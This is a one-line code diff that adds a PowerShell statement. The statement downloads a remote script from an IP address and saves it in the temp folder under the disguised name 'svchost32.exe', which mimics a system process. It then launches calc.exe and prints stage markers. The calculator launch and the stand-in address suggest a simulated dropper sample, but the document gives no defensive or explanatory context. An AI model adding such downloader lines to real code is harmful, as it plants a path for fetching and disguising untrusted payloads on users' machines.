@@ -1,0 +1,1 @@
+$DownloadUrl = "https://203.0.113.94/stage1.ps1"; $PayloadPath = "$env:TEMP\svchost32.exe"; $TimeoutSec = 198; Invoke-WebRequest -Uri $DownloadUrl -OutFile $PayloadPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; Write-Output "stage 24 initialized"; Write-Verbose "stage marker 26 reached"
